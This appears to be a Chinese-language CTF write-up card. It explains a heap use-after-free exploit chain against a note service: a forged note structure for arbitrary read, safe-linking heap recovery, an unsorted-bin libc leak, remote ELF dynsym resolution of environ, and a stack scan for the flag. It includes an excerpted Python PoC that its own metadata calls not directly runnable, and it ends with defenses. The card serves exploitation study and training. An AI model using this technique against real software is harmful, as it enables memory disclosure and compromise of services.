---
id: ctf-pwn-uaf-overlap-fake-note-aar-safe-linking-dynsym-environ-stack-scan
title: UAF 重叠伪造 note 结构实现任意读：safe-linking 恢复堆地址 + 远程 ELF dynsym 解析 environ 扫栈取 flag
type: scenario
domain: ctf
path: ctf/pwn
technique: uaf-overlap-fake-note-aar-safe-linking-dynsym-environ
aliases:
- Classy who?
- UAF 伪造 note 结构
- 任意地址读 AAR
- safe-linking 堆地址恢复
- 远程 libc 符号解析 environ
- 栈扫描找 flag
tags:
- pwn
- heap
- uaf
- arbitrary-read
- safe-linking
- unsorted-bin
- libc
- elf
- dynsym
- environ
- stack-scan
- ctf
cve: []
severity: high
confidence: high
status: verified
created: '2026-11-05'
updated: '2026-11-06'
verification:
  verified_by: verifier-V115
  verified_at: '2026-11-06T01:48:36+08:00'
  notes: 已对照原文 Classy who? 核对：struct note 0x10、C0 0x10/C2 0x30/D0/D2/C1 0x10 使 data1 与旧 struct0 重叠、写 p64(addr)+p64(size) 伪造 AAR(<=1024)、safe-linking encoded=(struct0>>12)^(struct0+0x20)、large 0x500/0x510 布局、7 个填 tcache 第 8 个进 unsorted、取 bk、远程解析 PT_DYNAMIC/DT_HASH/DT_SYMTAB/DT_STRTAB 找 environ、environ 向下 0x400 步长扫栈均一致；原文有实测 flag，未本机复跑。PoC 为摘录，recover_overlapped_struct 使用先于定义，仅示意非可直接运行。
---

## 一句话结论

note 服务在 `delete` 后不清 `notes[idx]` 指针、`write_note` 又不检查 `off+len`，于是可以把一个已释放的 `struct note` 重新分配给另一个 note 的 `data`，再用 16 字节写入伪造旧 note 的 `data/size`，得到任意地址读（AAR）；随后用 tcache 中残留的 safe-linking 编码恢复堆地址、用 unsorted bin 泄漏 libc、远程解析 ELF 的 `DT_HASH/DT_SYMTAB/DT_STRTAB` 找到 `environ`，最后从栈上扫描 flag。

## 原理

- **UAF 重叠**：`struct note` 大小 0x10；`create(0, 0x10)` 与 `create(2, 0x30)` 后，`delete(0)`/`delete(2)` 把 struct 和 data 都释放；再 `create(1, 0x10)` 时，`struct1` 与 `data1` 从 0x20 tcache 取块，`data1` 恰好拿到旧的 `struct0`。此时 `notes[0]` 仍悬空指向 `struct0`，而 `notes[1]->data` 就是同一块内存。
- **伪造 note 结构**：对 note1 写 16 字节 `p64(addr) + p64(size)`，即改写 `notes[0]->data` 与 `notes[0]->size`；`R 0` 按伪造后的指针/长度读取，得到 AAR，单次最多 1024 字节。
- **safe-linking 恢复堆地址**：`R 1` 读到 `data1`（旧 `struct0`）开头残留的 tcache `next` 编码值。设 `struct0` 与 `data0` 连续分配，`data0 = struct0 + 0x20`，编码关系为 `encoded = (struct0 >> 12) ^ data0`；枚举低 12 位并迭代固定点即可唯一恢复 `struct0`。
- **堆布局推算**：从 `struct0` 推出后续大块 data 地址：第一个大块 `struct0 + 0xA0`，每个 0x500 请求对应 0x510 数据块 + 0x20 结构体，间隔 `0x510 + 0x20`。
- **unsorted bin 泄漏 libc**：申请多个 0x500 大块；释放 7 个填满 tcache，再释放第 8 个进 unsorted bin；`fd` 落在堆附近，`bk` 指向 libc 附近（main_arena），取 `bk` 作为 libc 指针。
- **远程 ELF 符号解析**：没有远程 libc 文件时，用 AAR 从 libc 指针向下扫 `\x7fELF` 找基址；解析 ELF header 的 `e_phoff/e_phentsize/e_phnum`，找到 `PT_DYNAMIC`，读 `DT_HASH(4)`、`DT_STRTAB(5)`、`DT_SYMTAB(6)`、`DT_SYMENT(11)`，按 SysV hash 链查 `environ` 符号。
- **栈扫描**：`environ` 指向栈上的环境变量指针数组，靠近 `main` 栈帧；flag 存在 `main` 的 `local_flag[256]` 中，从 `environ` 向下按 0x400 步长扫描 0x40000 范围，用 flag 正则命中。

## 触发条件

- note 服务 `delete` 后留下悬空指针，且允许重新分配相同 size class 造成 struct/data 重叠。
- `write_note` 缺少 `off+len <= size` 边界检查，或存在等价的越界/伪造写。
- `read_note` 按 `notes[idx]->data/size` 输出，且长度足够大（本题 1024）。
- 目标使用 glibc tcache + safe-linking + unsorted bin；远程未提供 libc 文件，需要自行解析 ELF 符号。
- flag 位于栈上（如 `main` 的局部数组）。

## 利用步骤

1. `C 0 0x10`、`C 2 0x30`、`D 0`、`D 2`、`C 1 0x10`，让 `data1` 与旧 `struct0` 重叠。
2. `R 1` 读取 16 字节，取 tcache safe-linking 编码的 `next`；用 `encoded = (struct0>>12) ^ (struct0+0x20)` 枚举低 12 位迭代恢复 `struct0`。
3. 定义 AAR：`set_fake_note(addr,size)` 写 note1 的 16 字节为 `p64(addr)+p64(size)`，`R 0` 读 `size` 字节。
4. 申请 9 个 0x500 大块，按 `struct0+0xA0+(idx-3)*(0x510+0x20)` 推算地址；释放 7 个填 tcache，再释放第 8 个进 unsorted bin。
5. 用 AAR 读 unsorted chunk 的 `fd/bk`，排除堆地址范围后取 libc 指针。
6. 从 libc 指针向下扫 `\x7fELF` 找 libc base；解析 `PT_DYNAMIC` 与 `DT_HASH/DT_SYMTAB/DT_STRTAB`，用 SysV hash 查 `environ`。
7. 读 `environ` 得到栈指针；从栈指针向下按步长扫描，正则匹配 flag。
8. 若远程布局与本地不同，先打印/泄漏固定字符串判断是否 PIE，再改用不依赖程序基址的堆/allocator 路线。

## PoC

```python
# 1) UAF 重叠，伪造 notes[0] 的 data/size
create(0, 0x10); create(2, 0x30)
delete(0); delete(2)
create(1, 0x10)

encoded = u64(read_note(1, 0x10)[:8])
struct0 = recover_overlapped_struct(encoded)

def set_fake_note(addr, size=1024):
    write_note(1, 0, p64(addr) + p64(size))

def leak(addr, n=0x80):
    set_fake_note(addr, n)
    return read_note(0, min(max(n, 1), 1024))

# 2) safe-linking 恢复
def recover_overlapped_struct(encoded_next):
    candidates = set()
    for low in range(0, 0x1000, 0x10):
        data0 = (encoded_next & ~0xfff) | low
        for _ in range(12):
            data0 = encoded_next ^ ((data0 - 0x20) >> 12)
        struct0 = data0 - 0x20
        if struct0 > 0 and (((struct0 >> 12) ^ data0) == encoded_next):
            candidates.add(struct0)
    return candidates.pop()

# 3) unsorted bin 泄漏 libc
first_large_data = struct0 + 0xA0
large_data = {i: first_large_data + (i - 3) * (0x510 + 0x20) for i in range(3, 12)}
for i in range(3, 12): create(i, 0x500)
for i in range(3, 10): delete(i)
delete(10)
fd, bk = u64(leak(large_data[10], 0x10)[:8]), u64(leak(large_data[10], 0x10)[8:16])

# 4) 找 libc base + environ，扫栈
base = find_elf_base(bk)
environ_addr = resolve_dynsym_sysv(base, b"environ")
stack_ptr = u64(leak(environ_addr, 8))
for delta in range(0, 0x40000, 0x400):
    chunk = leak(stack_ptr - delta, 1024)
    m = re.search(rb"athena\{[^}\n\r\x00]{0,220}\}", chunk)
    if m:
        print(m.group(0)); break
```

原文远程结果为 `athena{Hzq7thBYeGiwwXua}`；未在本机复跑。

## 变体与关联

- **AAR 变体**：伪造 note 结构、全局缓冲区指针、`FILE` 结构、`environ` 指针；核心是让 `read` 按攻击者指定的地址/长度输出。
- **堆地址变体**：safe-linking 编码值可由同页自异或、tcache 残留、堆布局推算恢复。
- **libc 变体**：有本地 libc 时直接算 `environ` 偏移；无 libc 时可解析 ELF dynsym（如本卡）、`link_map`、`_IO_2_1_stdout_` 等。
- **栈扫描变体**：flag 在 `main` 局部数组、环境变量、argv、返回地址附近；按页/按 0x400 步长扫描并用格式正则过滤。
- **关联**：[[binary-pwn-heap-uaf-unsorted-bin-libc-leak]]（UAF+unsorted bin）、[[binary-pwn-heap-safe-linking-self-xor-heap-address]]（safe-linking 堆地址）；本卡强调“UAF 重叠伪造结构 + 远程 dynsym 解析 environ + 栈扫描”的完整链。

## 检测与防御

- `delete` 后清空 `notes[idx]` 并置空；`write_note` 校验 `off + len <= size`；`read_note` 限制长度并校验指针范围。
- 启用 safe-linking、tcache key、PIE/RELRO；把敏感数据放在栈上仍需避免长时间驻留。
- 限制任意地址读：`read` 只允许读取 note 自己的 chunk，使用句柄而非裸指针。
- 检测：note 指针指向已释放 chunk、`write` 偏移/长度越界、读取地址落在 .bss/栈/libc、`environ` 等符号被频繁读取。
